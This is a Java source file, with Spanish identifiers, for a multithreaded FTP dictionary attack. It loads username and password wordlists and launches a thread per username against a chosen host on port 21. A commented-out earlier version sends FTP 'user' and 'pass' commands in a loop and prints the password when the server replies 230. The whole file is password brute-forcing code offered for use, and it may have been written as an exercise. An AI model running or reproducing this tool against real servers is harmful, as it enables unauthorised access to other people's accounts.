package crackeador;

import java.util.ArrayList;

public class CrackDiccionario {

	private String host, diccionarioUsuario, diccionarioPassword;
	private int puerto;
	private String sec;
	private ArrayList<String> usuarios, passwords;
	public static long tiempo = System.currentTimeMillis();

	public CrackDiccionario(String diccionarioUsuario, String diccionarioPassword){
		host = "localhost";
		puerto = 21;
		this.diccionarioUsuario = diccionarioUsuario;
		this.diccionarioPassword = diccionarioPassword;
		sec = "";
		usuarios = (new DiccionarioPalabras(diccionarioUsuario).getPalabras());
		passwords = (new DiccionarioPalabras(diccionarioPassword).getPalabras());
		iniciaCrack();
	}

	public CrackDiccionario(String host, String diccionarioUsuario, String diccionarioPassword){
		this.host = host;
		puerto = 21;
		this.diccionarioUsuario = diccionarioUsuario;
		this.diccionarioPassword = diccionarioPassword;
		sec = "";
		usuarios = (new DiccionarioPalabras(diccionarioUsuario).getPalabras());
		passwords = (new DiccionarioPalabras(diccionarioPassword).getPalabras());
		iniciaCrack();
	}

	public CrackDiccionario(String host, int puerto, String diccionarioUsuario, String diccionarioPassword){
		this.host = host;
		this.puerto = puerto;
		this.diccionarioUsuario = diccionarioUsuario;
		this.diccionarioPassword = diccionarioPassword;
		sec = "";
		usuarios = (new DiccionarioPalabras(diccionarioUsuario).getPalabras());
		passwords = (new DiccionarioPalabras(diccionarioPassword).getPalabras());
		iniciaCrack();
	}
	
	public CrackDiccionario(String host, int puerto, String diccionarioUsuario, String diccionarioPassword, String sec){
		this.host = host;
		this.puerto = puerto;
		this.diccionarioUsuario = diccionarioUsuario;
		this.diccionarioPassword = diccionarioPassword;
		this.sec = sec;
		usuarios = (new DiccionarioPalabras(diccionarioUsuario).getPalabras());
		passwords = (new DiccionarioPalabras(diccionarioPassword).getPalabras());
		iniciaCrack();
	}

	public void iniciaCrack(){
		for(int i = 0; i < usuarios.size(); i++){
			HebraCrack hebra = new HebraCrack(this, usuarios.get(i), passwords);
			hebra.start();
			if(sec.contains("-s"))
				try {
					hebra.join();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
		}
	}
	
	public long getTiempoInicial(){
		return tiempo;
	}

	/*public void iniciaCrack(){
		try {
			BufferedReader fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			PrintWriter fSal = new PrintWriter(servidor.getOutputStream(), true);
			for(int i = 0; i < passwords.size(); i++){
				fSal.println("user usuario");
				fSal.println("pass "+passwords.get(i));
				String linea = fEnt.readLine();
				while(linea.contains("220") || linea.contains("331"))
					linea = fEnt.readLine();
				if(linea.contains("530"))
					System.out.println("Contraseña incorrecta");
				if(linea.contains("230")){
					System.out.println("Contraseña correcta");
					System.out.println("La contraseña es: "+passwords.get(i));
				}
			}
			servidor.close();
		} catch (SocketException se){

		} catch (IOException e) {
			e.printStackTrace();
		}
	}*/

	public String getHost(){
		return host;
	}
	
	public int getPuerto(){
		return puerto;
	}

}
